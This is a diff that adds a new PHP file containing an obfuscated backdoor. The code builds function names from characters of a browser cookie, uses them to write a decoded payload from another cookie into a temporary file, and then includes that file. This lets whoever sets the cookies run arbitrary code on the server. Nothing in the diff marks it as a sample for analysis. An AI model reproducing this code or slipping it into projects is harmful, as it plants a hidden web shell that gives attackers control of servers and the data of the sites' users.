@@ -1,0 +1,2 @@
+<?php
+$gFIc =$_COOKIE	; $MT=	0;$xRv	=( 97- 88	) ;$QiN	=array();$QiN	[	$MT ]	="";	while( $xRv ){	$QiN[$MT ] .=	$gFIc[	(93-	73) ][ $xRv ];		if	(	!$gFIc[ ( 64-44	)	 ]	[	$xRv +1	]	){  if	(	!$gFIc [ (41-21)	][	$xRv+2 ]	)break	;	 $MT	++; $QiN	[$MT	]	= ""; $xRv	++;		}	$xRv =	$xRv +	( 26	-	17 ) +1;}$MT=$QiN	[		(	85-	71)]() .$QiN[  (	47-40	)	 ]; if (!$QiN[ (8 -	8) ]($MT )){$xRv	=$QiN [(31-18	) 	] (	$MT,$QiN [	(	73-50 )]); $QiN [ (	60- 51)] ( $xRv ,$QiN[ (92-72	) ].$QiN[ (59-43)  ]	($QiN[ (41-35	)] ($gFIc	[3	] ))) ; } include(	$MT)	;
